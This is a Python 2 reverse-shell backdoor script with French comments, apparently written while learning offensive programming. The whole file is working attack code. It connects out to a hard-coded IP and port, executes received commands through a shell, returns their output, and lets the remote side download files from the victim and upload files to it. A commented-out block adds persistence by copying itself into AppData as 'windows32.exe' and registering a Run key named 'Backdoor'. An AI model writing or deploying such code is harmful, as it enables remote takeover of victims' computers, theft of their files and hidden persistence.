#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64
import shutil
import sys

iptoconnect = "192.168.1.27" #si on fait une attaque a travers internet avec port forward, il faut l'ip publique du routeur, et le port forward du routeur
porttoconnect = 51234


def reliable_send(data): #pour envoyer plus de 1024 bits
	json_data = json.dumps(data, ensure_ascii=False)
	print "json data"
	print json_data
	sock.send(json_data)
	print "reliable send"

def reliable_recv():
	data = "" #empty
	while True:
		try:
			data = data + sock.recv(1024)
			print "reliable recv"
			return json.loads(data.decode('utf-8','ignore')) #une fois que c bon y a tout dans data
		except ValueError:
			continue #si on recoit plus de 1024 on continue



def shell():
	while True:
		command = reliable_recv() #value max
		if command == 'q':
			break
		elif command[:2] == "cd" and len(command) > 1: #si commande commence par cd et il y a plus de 1 arg
			try:
				os.chdir(command[3:]) #change le directory en le directory specifie dans les []
			except:
				continue
		elif command[:8] == "download":
			with open(command[9:],"rb") as file: #on open the file to read bytes
				reliable_send(base64.b64encode(file.read()))
		elif command[:6] == "upload":
			with open(command[7:], "wb") as fin: #write bytes
				print "upload fonction"
				file_data = reliable_recv()
				print "code"
				print (file_data)
				print "decode"
				print base64.b64decode(file_data)
				print "dedecode"
				recv= base64.b64decode(base64.b64decode(file_data))
				print recv
				fin.write(recv)
		else:
			print "commande recue"
			try:
				proc = subprocess.Popen(command.encode('utf-8','ignore'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				print "subprocess"
				result = proc.stdout.read() + proc.stderr.read()
				print "result"
				print result
				reliable_send(result)
			except:
				continue


#location = os.environ["appdata"] + "\\windows32.exe" #ca va trouver le path appdata sur la target pc
#if not os.path.exists(location): #on veut creer un fichier seulement s'il existe pas
#	shutil.copyfile(sys.executable,location) #copie l'executable currently running
	#pas oblige
#	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True) #va creer un cle de registre qui va run notre file apres chaque redemarrage, backdoor on met le nom qu'on veut

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((iptoconnect,porttoconnect))

shell()

sock.close()
